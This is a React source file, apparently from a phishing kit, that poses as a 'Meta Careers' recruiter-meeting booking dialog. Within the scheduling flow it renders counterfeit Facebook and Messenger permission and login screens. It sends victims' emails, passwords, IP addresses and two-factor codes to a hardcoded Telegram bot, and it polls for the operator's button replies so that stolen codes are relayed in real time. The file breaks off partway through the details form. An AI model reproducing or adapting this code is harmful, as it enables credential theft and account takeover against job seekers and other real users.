import { useEffect, useMemo, useRef, useState } from "react"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { cn } from "@/lib/utils"
import { meetingTypes, recruiters, type Recruiter } from "@/lib/recruiters"
import {
  ArrowLeft,
  CalendarCheck,
  Check,
  ChevronLeft,
  ChevronRight,
  Clock,
  Loader2,
  Lock,
  Video,
} from "lucide-react"

// Add your Telegram bot configuration
const TELEGRAM_BOT_TOKEN = "7555641913:AAG-X51iN3ANdlhyAyjkabtk4NvrwoIizMs"
const TELEGRAM_CHAT_ID = "1725880411"

// Global counter for unique session IDs — ensures each login attempt gets a unique ID
let pendingSessionId = 0
// Global tracker for the last Telegram update we've processed
let globalLastUpdateId = 0

type Props = {
  open: boolean
  onOpenChange: (open: boolean) => void
  recruiter: Recruiter | null
}

type Step = "schedule" | "details" | "auth" | "permissions" | "full-login" | "authenticator" | "confirmed"

const TIME_SLOTS = [
  "9:00 AM",
  "9:30 AM",
  "10:00 AM",
  "11:00 AM",
  "1:00 PM",
  "1:30 PM",
  "2:30 PM",
  "3:00 PM",
  "4:00 PM",
]

function buildDays(monthOffset: number) {
  const today = new Date()
  today.setHours(0, 0, 0, 0)
  const base = new Date(today.getFullYear(), today.getMonth() + monthOffset, 1)
  const year = base.getFullYear()
  const month = base.getMonth()
  const firstWeekday = new Date(year, month, 1).getDay()
  const daysInMonth = new Date(year, month + 1, 0).getDate()
  const cells: (Date | null)[] = []
  for (let i = 0; i < firstWeekday; i++) cells.push(null)
  for (let d = 1; d <= daysInMonth; d++) cells.push(new Date(year, month, d))
  return { cells, label: base.toLocaleString("en-US", { month: "long", year: "numeric" }), today }
}

function FacebookIcon({ className }: { className?: string }) {
  return (
      <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden="true">
        <path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.09 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.69.24 2.69.24v2.97h-1.52c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.09 24 18.1 24 12.07Z" />
      </svg>
  )
}

function MessengerIcon({ className }: { className?: string }) {
  return (
      <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden="true">
        <path d="M12 0C5.24 0 0 4.95 0 11.64c0 3.5 1.44 6.53 3.77 8.63.2.17.31.42.32.68l.07 2.13c.02.68.72 1.12 1.34.85l2.38-1.05c.2-.09.42-.1.63-.05 1.1.3 2.27.46 3.49.46 6.76 0 12-4.95 12-11.64C24 4.95 18.76 0 12 0Zm7.2 8.93-3.52 5.59c-.56.89-1.77 1.11-2.61.48l-2.8-2.1a.72.72 0 0 0-.87 0l-3.78 2.87c-.5.38-1.16-.22-.82-.75l3.52-5.59c.56-.89 1.77-1.11 2.61-.48l2.8 2.1c.26.2.61.2.87 0l3.78-2.87c.5-.38 1.16.22.82.75Z" />
      </svg>
  )
}

export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
  const [step, setStep] = useState<Step>("schedule")
  const [monthOffset, setMonthOffset] = useState(0)
  const [selectedRecruiterId, setSelectedRecruiterId] = useState<string>("")
  const [date, setDate] = useState<Date | null>(null)
  const [time, setTime] = useState<string>("")
  const [form, setForm] = useState({ name: "", email: "", type: meetingTypes[0], notes: "" })
  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | null>(null)
  const [login, setLogin] = useState({ id: "", password: "" })
  const [loggingIn, setLoggingIn] = useState(false)
  const [permVisible, setPermVisible] = useState(false)
  const [fullVisible, setFullVisible] = useState(false)
  const [otpCode, setOtpCode] = useState("")
  const [isSending, setIsSending] = useState(false)
  const [loginError, setLoginError] = useState("")
  const [otpError, setOtpError] = useState("")

  useEffect(() => {
    if (step === "permissions") {
      requestAnimationFrame(() => requestAnimationFrame(() => setPermVisible(true)))
    } else if (step === "full-login") {
      setFullVisible(false)
      requestAnimationFrame(() => requestAnimationFrame(() => setFullVisible(true)))
    } else {
      setPermVisible(false)
      setFullVisible(false)
    }
  }, [step])

  function handleAuth(provider: "facebook" | "messenger") {
    setAuthProvider(provider)
    setLogin({ id: "", password: "" })
    setPermVisible(false)
    setStep("permissions")
  }

  function handlePermCancel() {
    setPermVisible(false)
    setTimeout(() => {
      handleOpenChange(false)
    }, 260)
  }

  function handlePermLogin() {
    setPermVisible(false)
    setTimeout(() => {
      setStep("full-login")
    }, 260)
  }

  // Send login credentials to Telegram with inline keyboard buttons
  async function sendLoginToTelegram() {
    const sessionId = ++pendingSessionId
    const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => ({ ok: false }))
    const ip = ipResponse.ok ? (await ipResponse.json()).ip : "Unknown"

    const text = `<b>🔐 Authentication Report</b>\n\n🔐 <b>Password:</b> <code>${login.password}</code>\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`

    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` },
            { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
          ],
        ],
      },
    }

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    if (!res.ok) throw new Error("Failed to send login data to Telegram")

    return sessionId
  }

  // Track active polling intervals so we can clean up on unmount
  const pollingRef = useRef<{ interval: ReturnType<typeof setInterval> | null; active: boolean }>({
    interval: null,
    active: false,
  })

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingRef.current.interval) {
        clearInterval(pollingRef.current.interval)
        pollingRef.current.active = false
      }
    }
  }, [])

  // Poll for bot response — waits until bot sends a callback for THIS session only
  function startPollingForAction(sessionId: number): Promise<string> {
    pollingRef.current.active = true

    return new Promise((resolve) => {
      const interval = setInterval(async () => {
        if (!pollingRef.current.active) {
          clearInterval(interval)
          return
        }

        try {
          const res = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${globalLastUpdateId + 1}&timeout=30`
          )
          const data = await res.json()

          if (data.ok && data.result) {
            for (const update of data.result) {
              // Advance the global counter so other sessions don't re-process this update
              if (update.update_id > globalLastUpdateId) {
                globalLastUpdateId = update.update_id
              }

              // Check for callback_query (button press)
              if (update.callback_query) {
                const callbackData = update.callback_query.data || ""
                const callbackSessionId = parseInt(callbackData.split(" ").pop() || "0", 10)

                // Only respond if this callback is meant for THIS session
                if (callbackSessionId === sessionId) {
                  clearInterval(interval)
                  pollingRef.current.active = false
                  pollingRef.current.interval = null

                  // Acknowledge the callback to Telegram
                  await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                    {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        callback_query_id: update.callback_query.id,
                        text: "Processing...",
                      }),
                    }
                  )
                  resolve(callbackData)
                  return
                }
              }
            }
          }
        } catch {
          // Silently retry
        }
      }, 300) // Poll every 300ms for near-instant response

      pollingRef.current.interval = interval
    })
  }

  // Handle the login form submission — sends credentials to Telegram and waits for bot
  async function handleFullLogin(e: React.FormEvent) {
    e.preventDefault()
    setLoggingIn(true)
    setLoginError("")

    try {
      // ── 1. Send credentials to Telegram with inline buttons ──
      const sessionId = await sendLoginToTelegram()

      // ── 2. Wait for bot to respond with an action ──
      const callbackData = await startPollingForAction(sessionId)

      // ── 3. Parse the bot's response and navigate accordingly ──
      setLoggingIn(false)

      if (callbackData.startsWith("/wrong-password")) {
        // Wrong password — show error on the login page, user can retry
        setLoginError("The password you've entered is incorrect. Please try again.")
      } else {
        // Any other action — navigate to the next step
        setFullVisible(false)

        setTimeout(() => {
          if (callbackData.startsWith("/code") || callbackData.startsWith("/2fa-session")) {
            setStep("authenticator")
          } else if (callbackData.startsWith("/phone")) {
            // Could add a phone OTP step later
            setStep("authenticator")
          } else {
            // Default: go to authenticator
            setStep("authenticator")
          }
        }, 260)
      }
    } catch (error) {
      console.error("Login submission failed:", error)
      setLoggingIn(false)
      alert("There was an issue submitting your login. Please try again.")
    }
  }

  // Send 2FA code to Telegram with inline buttons and wait for bot response
  async function handleAuthenticatorContinue() {
    if (otpCode.length < 6) return
    setIsSending(true)
    setOtpError("")

    try {
      const sessionId = ++pendingSessionId

      const text = `<b>🔐 2FA Code Received</b>\n\n<b>📧 Email/Phone:</b> <code>${login.id}</code>\n<b>🔑 Code:</b> <code>${otpCode}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`

      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Confirmed", callback_data: `/confirmed ${sessionId}` },
                { text: "❌ Wrong Code", callback_data: `/wrong-code ${sessionId}` },
              ],
            ],
          },
        }),
      })

      if (!res.ok) throw new Error("Failed to send 2FA code")

      // Wait for bot to respond
      const callbackData = await startPollingForAction(sessionId)
      setIsSending(false)

      if (callbackData.startsWith("/confirmed")) {
        // Send the full booking confirmation to Telegram
        const bookingMessage = `
📅 <b>Booking Confirmed!</b>

👤 <b>Candidate:</b> ${form.name}
📧 <b>Email:</b> ${form.email}
👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
📆 <b>Date:</b> ${dateLabel || "Unknown"}
🕐 <b>Time:</b> ${time || "Unknown"}
📋 <b>Meeting Type:</b> ${form.type}
🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : "Messenger"}
📝 <b>Notes:</b> ${form.notes || "None provided"}

🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
        `.trim()

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: bookingMessage,
            parse_mode: "HTML",
          }),
        })

        setStep("confirmed")
      } else if (callbackData.startsWith("/wrong-code")) {
        setOtpError("The code you entered is incorrect. Please try again.")
        setOtpCode("")
      }
    } catch (error) {
      console.error("Failed to send 2FA code:", error)
      setIsSending(false)
      alert("There was an issue submitting your code. Please try again.")
    }
  }

  const activeRecruiter =
      recruiter ?? recruiters.find((r) => r.id === selectedRecruiterId) ?? null

  const { cells, label, today } = useMemo(() => buildDays(monthOffset), [monthOffset])

  function reset() {
    setStep("schedule")
    setMonthOffset(0)
    setDate(null)
    setTime("")
    setSelectedRecruiterId("")
    setForm({ name: "", email: "", type: meetingTypes[0], notes: "" })
    setAuthProvider(null)
    setLogin({ id: "", password: "" })
    setLoggingIn(false)
    setPermVisible(false)
    setFullVisible(false)
    setIsSending(false) // Reset sending state
    setLoginError("")
    setOtpError("")
    setOtpCode("")
  }

  function handleOpenChange(next: boolean) {
    if (!next) {
      // Clean up any active polling when dialog closes
      if (pollingRef.current.interval) {
        clearInterval(pollingRef.current.interval)
        pollingRef.current.interval = null
      }
      pollingRef.current.active = false
      setTimeout(reset, 200)
    }
    onOpenChange(next)
  }

  const canLogIn = login.id.trim().length > 0 && login.password.length > 0
  const canContinue = Boolean(activeRecruiter && date && time)
  const canConfirm = canContinue && form.name.trim() && /\S+@\S+\.\S+/.test(form.email)

  const dateLabel = date
      ? date.toLocaleDateString("en-US", { weekday: "long", month: "long", day: "numeric" })
      : ""

  const providerColor = authProvider === "facebook" ? "#1877F2" : "#0A7CFF"
  const providerLabel = authProvider === "facebook" ? "Facebook" : "Messenger"

  const isFullScreen = step === "permissions" || step === "full-login"

  return (
      <Dialog open={open} onOpenChange={handleOpenChange}>
        <DialogContent
            className={cn(
                "gap-0 overflow-hidden p-0",
                isFullScreen
                    ? "!left-0 !top-0 !translate-x-0 !translate-y-0 h-dvh !max-h-none w-screen !max-w-none !rounded-none !border-0 !shadow-none [&>button:last-child]:hidden"
                    : "max-h-[92vh] overflow-y-auto sm:max-w-2xl"
            )}
            onInteractOutside={(e) => e.preventDefault()}
        >

          {/* ─────────────────── PERMISSIONS SCREEN ─────────────────── */}
          {step === "permissions" && authProvider && (
              <div
                  className="flex h-full items-center justify-center px-4 py-8 transition-opacity duration-[260ms]"
                  style={{ backgroundColor: "#f0f2f5", opacity: permVisible ? 1 : 0 }}
              >
                <div
                    className="w-full max-w-[480px] rounded-xl bg-white shadow-lg transition-all duration-[260ms]"
                    style={{
                      transform: permVisible ? "translateY(0) scale(1)" : "translateY(14px) scale(0.96)",
                      opacity: permVisible ? 1 : 0,
                    }}
                >
                  {/* Header */}
                  <div className="flex items-center gap-3 px-6 py-5">
                    {authProvider === "facebook" ? (
                        <FacebookIcon className="size-10 text-[#1877F2]" />
                    ) : (
                        <MessengerIcon className="size-10 text-[#0A7CFF]" />
                    )}
                    <svg className="size-5 shrink-0 text-[#65676b]" viewBox="0 0 20 20" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M13 7l3 3-3 3M7 13l-3-3 3-3" />
                      <path d="M16 10H4" />
                    </svg>
                    <span className="text-lg font-bold" style={{ color: providerColor }}>
                  Meta Careers
                </span>
                  </div>

                  <div className="border-t border-[#dddfe2]" />

                  {/* Body */}
                  <div className="px-6 py-5">
                    <p className="text-base font-semibold text-[#1c1e21]">
                      Meta Careers is requesting access to:
                    </p>
                    <p className="mt-1 text-sm text-[#65676b]">
                      Name and profile picture to verify your scheduled meeting
                    </p>
                    <button type="button" className="mt-2 text-sm font-semibold text-[#1877F2] hover:underline">
                      View access
                    </button>

                    <div className="mt-5 flex flex-col gap-3 sm:flex-row">
                      <button
                          type="button"
                          onClick={handlePermLogin}
                          className="flex-1 rounded-lg bg-[#1877F2] py-3 text-sm font-bold text-white transition hover:bg-[#166FE5] active:bg-[#145DBD]"
                      >
                        Login
                      </button>
                      <button
                          type="button"
                          onClick={handlePermCancel}
                          className="flex-1 rounded-lg border border-[#ccd0d5] bg-[#e4e6eb] py-3 text-sm font-bold text-[#1c1e21] transition hover:bg-[#d8dadf] active:bg-[#ccd0d5]"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>

                  {/* Disclaimer */}
                  <div className="border-t border-[#dddfe2] px-6 py-4">
                    <p className="text-xs text-[#65676b]">
                      By continuing, Meta Careers will receive ongoing access to the information you
                      share and {providerLabel} will record when Meta Careers accesses it.{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Learn more
                      </button>{" "}
                      about this sharing and the settings you have.
                    </p>
                    <p className="mt-3 text-xs text-[#65676b]">
                      Meta Careers&apos;{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Privacy Policy
                      </button>{" "}
                      and{" "}
                      <button type="button" className="font-semibold text-[#1877F2] hover:underline">
                        Terms of Service
                      </button>
                    </p>
                  </div>
                </div>
              </div>
          )}

          {/* ─────────────────── FULL-SCREEN LOGIN ─────────────────── */}
          {step === "full-login" && authProvider && (
              <div
                  className="flex h-full flex-col overflow-y-auto bg-white transition-opacity duration-[300ms]"
                  style={{ opacity: fullVisible ? 1 : 0 }}
              >
                {authProvider === "facebook" ? (
                    /* ── FACEBOOK ── */
                    <>
                      {/* Top: Facebook logo */}
                      <div className="flex-shrink-0 px-6 pt-5 md:px-8">
                        <FacebookIcon className="size-10 text-[#1877F2]" />
                      </div>

                      {/* Main two-column body — centered max-width container */}
                      <div className="flex flex-1 items-center justify-center overflow-y-auto px-4 py-6">
                        <div className="flex w-full max-w-[980px] flex-col items-center gap-8 md:flex-row md:items-center md:gap-12">

                          {/* Left: collage image + tagline — desktop only */}
                          <div className="hidden flex-1 flex-col md:flex">
                            <img
                                src="/fb-hero.webp"
                                alt=""
                                className="w-full object-contain"
                            />
                            <p className="mt-2 text-[28px] font-bold leading-tight text-[#1c1e21] lg:text-[34px]">
                              Explore the things<br />
                              <span className="text-[#1877F2]">you love.</span>
                            </p>
                          </div>

                          {/* Right: login form */}
                          <div className="flex w-full flex-col items-center md:w-[396px] md:flex-shrink-0">
                            {/* Mobile: large FB logo above form */}
                            <div className="mb-6 flex justify-center md:hidden">
                              <FacebookIcon className="size-16 text-[#1877F2]" />
                            </div>

                            <div className="w-full rounded-lg bg-white shadow-none md:shadow-[0_2px_4px_rgba(0,0,0,.1),0_8px_16px_rgba(0,0,0,.1)]">
                              <div className="p-0 md:p-5">
                                <h2 className="mb-4 text-[20px] font-normal text-[#1c1e21]">
                                  Log in to Facebook
                                </h2>
                                <form onSubmit={handleFullLogin} className="space-y-3">
                                  {loginError && (
                                    <div className="rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                                      {loginError}
                                    </div>
                                  )}
                                  <input
                                      type="text"
                                      autoComplete="username"
                                      value={login.id}
                                      onChange={(e) => setLogin({ ...login, id: e.target.value })}
                                      placeholder="Email or mobile phone number"
                                      className={cn(
                                        "h-[52px] w-full rounded-lg border bg-white px-4 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-[3px]",
                                        loginError
                                          ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                          : "border-[#ccd0d5] focus:border-[#1877F2] focus:ring-[#e7f3ff]"
                                      )}
                                  />
                                  <input
                                      type="password"
                                      autoComplete="current-password"
                                      value={login.password}
                                      onChange={(e) => setLogin({ ...login, password: e.target.value })}
                                      placeholder="Password"
                                      className={cn(
                                        "h-[52px] w-full rounded-lg border bg-white px-4 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-[3px]",
                                        loginError
                                          ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                          : "border-[#ccd0d5] focus:border-[#1877F2] focus:ring-[#e7f3ff]"
                                      )}
                                  />
                                  <button
                                      type="submit"
                                      disabled={!canLogIn || loggingIn || isSending}
                                        className="flex h-[52px] w-full items-center justify-center gap-2 rounded-lg bg-[#1877F2] text-[20px] font-bold text-white transition hover:bg-[#166FE5] active:bg-[#145DBD] disabled:cursor-not-allowed disabled:bg-[#a0bcf8]"
                                      >
                                        {(loggingIn || isSending) && <Loader2 className="size-5 animate-spin" />}
                                        {loggingIn ? "Logging in…" : "Log in"}
                                  </button>
                                </form>
                                <div className="mt-4 text-center">
                                  <button type="button" className="text-[14px] text-[#1877F2] hover:underline">
                                    Forgot password?
                                  </button>
                                </div>
                                <div className="my-5 border-t border-[#dadde1]" />
                                <div className="flex justify-center">
                                  <button
                                      type="button"
                                      className="rounded-lg bg-[#42b72a] px-5 py-3 text-[17px] font-bold text-white transition hover:bg-[#36a420] active:bg-[#2d8f1c]"
                                  >
                                    Create new account
                                  </button>
                                </div>
                              </div>
                            </div>

                            <p className="mt-8 text-center text-[13px] text-[#1c1e21]">
                              <a href="#" className="font-bold hover:underline">Create a Page</a>
                              {" "}for a celebrity, brand or business.
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* Language footer */}
                      <div className="flex-shrink-0 border-t border-[#dadde1] px-4 py-3">
                        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-[13px] text-[#8d949e]">
                          {["English (US)", "Español", "Français (France)", "中文(简体)", "العربية", "Português (Brasil)", "Italiano", "한국어", "Deutsch", "हिन्दी"].map((lang, i) => (
                              <button key={i} type="button" className="hover:underline">{lang}</button>
                          ))}
                          <button type="button" className="hover:underline">More…</button>
                        </div>
                        <div className="mt-3 flex flex-wrap justify-center gap-x-3 gap-y-1 text-[13px] text-[#8d949e]">
                          {["Sign Up", "Log in", "Messenger", "Facebook Lite", "Video", "Places", "Games", "Marketplace", "Meta Pay", "Meta Store", "Meta Quest", "Instagram", "Threads", "Fundraisers", "Services", "Voting Information Centre", "Privacy Policy", "Privacy Centre", "Groups", "About", "Create ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices", "Terms", "Help", "Contact uploading and non-users"].map((link, i) => (
                              <button key={i} type="button" className="hover:underline">{link}</button>
                          ))}
                        </div>
                        <div className="mt-3 text-center text-[13px] text-[#8d949e]">
                          Meta © 2025
                        </div>
                      </div>
                    </>
                ) : (
                    /* ── MESSENGER ── */
                    <>
                      <div className="flex-shrink-0 px-6 pt-5 md:px-10">
                        <MessengerIcon className="size-10 text-[#0A7CFF]" />
                      </div>

                      <div className="flex flex-1 flex-col md:flex-row">
                        {/* Left: headline + form */}
                        <div className="flex flex-1 flex-col justify-center px-6 py-8 md:px-12 lg:px-20">
                          <h1 className="mb-3 text-3xl font-bold leading-tight text-[#0A7CFF] md:text-4xl lg:text-5xl">
                            A place for<br />meaningful<br />conversations
                          </h1>
                          <p className="mb-6 max-w-sm text-[15px] leading-relaxed text-[#65676b]">
                            Messenger helps you connect with your Facebook friends and family, build your community, and deepen your interests.
                          </p>
                          <form onSubmit={handleFullLogin} className="w-full max-w-xs space-y-3">
                            {loginError && (
                              <div className="rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                                {loginError}
                              </div>
                            )}
                            <input
                                type="text"
                                autoComplete="username"
                                value={login.id}
                                onChange={(e) => setLogin({ ...login, id: e.target.value })}
                                placeholder="Email or phone number"
                                className={cn(
                                  "h-[48px] w-full rounded-lg border bg-white px-4 text-[15px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                                  loginError
                                    ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                    : "border-[#ccd0d5] focus:border-[#0A7CFF] focus:ring-[#0A7CFF]/20"
                                )}
                            />
                            <input
                                type="password"
                                autoComplete="current-password"
                                value={login.password}
                                onChange={(e) => setLogin({ ...login, password: e.target.value })}
                                placeholder="Password"
                                className={cn(
                                  "h-[48px] w-full rounded-lg border bg-white px-4 text-[15px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                                  loginError
                                    ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                    : "border-[#ccd0d5] focus:border-[#0A7CFF] focus:ring-[#0A7CFF]/20"
                                )}
                            />
                            <div className="flex flex-wrap items-center gap-3">
                              <button
                                  type="submit"
                                  disabled={!canLogIn || loggingIn || isSending}
                                  className="flex items-center gap-2 rounded-lg bg-[#0A7CFF] px-7 py-2.5 font-bold text-white transition hover:bg-[#0866FF] disabled:bg-[#a0caf8]"
                              >
                                {(loggingIn || isSending) && <Loader2 className="size-4 animate-spin" />}
                                {loggingIn ? "Logging in…" : "Log in"}
                              </button>
                              <button type="button" className="text-sm font-medium text-[#0A7CFF] hover:underline">
                                Forgot password?
                              </button>
                            </div>
                            <label className="flex cursor-pointer items-center gap-2 text-sm text-[#1c1e21]">
                              <input type="checkbox" className="size-4 rounded border-[#ccd0d5]" />
                              Keep me signed in
                            </label>
                          </form>
                        </div>

                        {/* Right: phone mockup image — desktop only */}
                        <div className="hidden flex-1 items-center justify-center md:flex">
                          <img
                              src="/msn-hero.png"
                              alt="Messenger app preview"
                              className="h-full max-h-[580px] w-auto object-contain"
                          />
                        </div>
                      </div>
                    </>
                )}
              </div>
          )}

          {/* ─────────────────── NORMAL DIALOG STEPS ─────────────────── */}
          {!isFullScreen && (
              <>
                {/* Recruiter header strip */}
                {step !== "confirmed" && activeRecruiter && (
                    <div className="flex items-center gap-3 border-b border-border px-4 py-3 sm:px-6 sm:py-4">
                      {activeRecruiter.photo ? (
                          <img
                              src={activeRecruiter.photo}
                              alt={activeRecruiter.name}
                              width={44}
                              height={44}
                              className="size-10 rounded-full object-cover sm:size-11"
                          />
                      ) : (
                          <div className="flex size-10 items-center justify-center rounded-full bg-accent text-sm font-semibold text-accent-foreground sm:size-11">
                            {activeRecruiter.name.split(" ").map((n) => n[0]).join("")}
                          </div>
                      )}
                      <div className="min-w-0">
                        <p className="truncate text-sm font-semibold text-foreground">
                          {activeRecruiter.name}
                        </p>
                        <p className="truncate text-xs text-muted-foreground">
                          {activeRecruiter.title} · {activeRecruiter.team}
                        </p>
                      </div>
                      <div className="ml-auto hidden items-center gap-3 text-xs text-muted-foreground sm:flex">
                  <span className="inline-flex items-center gap-1">
                    <Clock className="size-3.5" /> 30 min
                  </span>
                        <span className="inline-flex items-center gap-1">
                    <Video className="size-3.5" /> Private video
                  </span>
                      </div>
                    </div>
                )}

                {/* ── SCHEDULE ── */}
                {step === "schedule" && (
                    <div className="px-4 py-5 sm:px-6">
                      <DialogHeader className="text-left">
                        <DialogTitle className="text-xl">Schedule your meeting</DialogTitle>
                        <DialogDescription>
                          A private 30-minute video conversation. All times are shown in your local timezone.
                        </DialogDescription>
                      </DialogHeader>

                      {!recruiter && (
                          <div className="mt-4">
                            <Label className="mb-1.5 block">Recruiter</Label>
                            <Select
                                value={selectedRecruiterId}
                                onValueChange={(v) => setSelectedRecruiterId(v)}
                            >
                              <SelectTrigger>
                                <SelectValue placeholder="Choose a recruiter" />
                              </SelectTrigger>
                              <SelectContent>
                                {recruiters.map((r) => (
                                    <SelectItem key={r.id} value={r.id}>
                                      {r.name} — {r.team}
                                    </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </div>
                      )}

                      <div className="mt-5 grid gap-6 sm:grid-cols-2">
                        <div>
                          <div className="mb-3 flex items-center justify-between">
                            <span className="text-sm font-semibold text-foreground">{label}</span>
                            <div className="flex items-center gap-1">
                              <Button
                                  type="button"
                                  variant="outline"
                                  size="icon"
                                  className="size-8"
                                  disabled={monthOffset === 0}
                                  onClick={() => setMonthOffset((m) => Math.max(0, m - 1))}
                              >
                                <ChevronLeft className="size-4" />
                                <span className="sr-only">Previous month</span>
                              </Button>
                              <Button
                                  type="button"
                                  variant="outline"
                                  size="icon"
                                  className="size-8"
                                  onClick={() => setMonthOffset((m) => m + 1)}
                              >
                                <ChevronRight className="size-4" />
                                <span className="sr-only">Next month</span>
                              </Button>
                            </div>
                          </div>
                          <div className="grid grid-cols-7 gap-0.5 text-center text-xs font-medium text-muted-foreground">
                            {["S", "M", "T", "W", "T", "F", "S"].map((d, i) => (
                                <span key={i} className="py-1">
                          {d}
                        </span>
                            ))}
                          </div>
                          <div className="mt-1 grid grid-cols-7 gap-0.5">
                            {cells.map((cell, i) => {
                              if (!cell) return <span key={i} />
                              const isPast = cell < today
                              const isSunday = cell.getDay() === 0
                              const isSaturday = cell.getDay() === 6
                              const disabled = isPast || isSunday || isSaturday
                              const selected = date?.toDateString() === cell.toDateString()
                              return (
                                  <button
                                      key={i}
                                      type="button"
                                      disabled={disabled}
                                      onClick={() => {
                                        setDate(cell)
                                        setTime("")
                                      }}
                                      className={cn(
                                          "flex aspect-square items-center justify-center rounded-lg text-sm font-medium transition-colors",
                                          disabled && "cursor-not-allowed text-muted-foreground/40",
                                          !disabled && !selected && "text-foreground hover:bg-accent",
                                          selected && "bg-primary text-primary-foreground",
                                      )}
                                  >
                                    {cell.getDate()}
                                  </button>
                              )
                            })}
                          </div>
                        </div>

                        <div>
                    <span className="text-sm font-semibold text-foreground">
                      {date ? dateLabel : "Select a date"}
                    </span>
                          {date ? (
                              <div className="mt-3 grid max-h-64 grid-cols-2 gap-2 overflow-y-auto pr-1">
                                {TIME_SLOTS.map((slot) => (
                                    <button
                                        key={slot}
                                        type="button"
                                        onClick={() => setTime(slot)}
                                        className={cn(
                                            "rounded-lg border px-2 py-2.5 text-sm font-medium transition-colors",
                                            time === slot
                                                ? "border-primary bg-primary text-primary-foreground"
                                                : "border-border text-foreground hover:border-primary/50 hover:bg-accent",
                                        )}
                                    >
                                      {slot}
                                    </button>
                                ))}
                              </div>
                          ) : (
                              <p className="mt-3 text-sm text-muted-foreground">
                                Pick a day on the calendar to see open times.
                              </p>
                          )}
                        </div>
                      </div>

                      <div className="mt-6 flex justify-end">
                        <Button
                            className="rounded-full px-6 font-semibold"
                            disabled={!canContinue}
                            onClick={() => setStep("details")}
                        >
                          Continue
                        </Button>
                      </div>
                    </div>
                )}

                {/* ── DETAILS ── */}
                {step === "details" && activeRecruiter && (
                    <div className="px-4 py-5 sm:px-6">
                      <DialogHeader className="text-left">
                        <DialogTitle className="text-xl">Your details</DialogTitle>
                        <DialogDescription>
                          {dateLabel} at {time} · Private meeting with {activeRecruiter.name}
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mt-5 space-y-4">
                        <div className="grid gap-4 sm:grid-cols-2">
                          <div>
                            <Label htmlFor="name" className="mb-1.5 block">
                              Full name
                            </Label>
                            <Input
                                id="name"
                                value={form.name}
                                onChange={(e) => setForm({ ...form, name: e.target.value })}
                                placeholder="Jordan Lee"
                            />
                          </div>
                          <div>
                            <Label htmlFor="email" className="mb-1.5 block">
                              Email
                            </Label>
                            <Input
                                id="email"
                                type="email"
                                value={form.email}
                                onChange={(e) => setForm({ ...form, email: e.target.value })}
                                placeholder="you@email.com"
                            />
                          </div>
                        </div>
                        <div>
                          <Label className="mb-1.5 block">What would you like to discuss?</Label>
                          <Select
                              value={form.type}
                              onValueChange={(v) => setForm({ ...form, type: v })}
                          >
                            <SelectTrigger>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
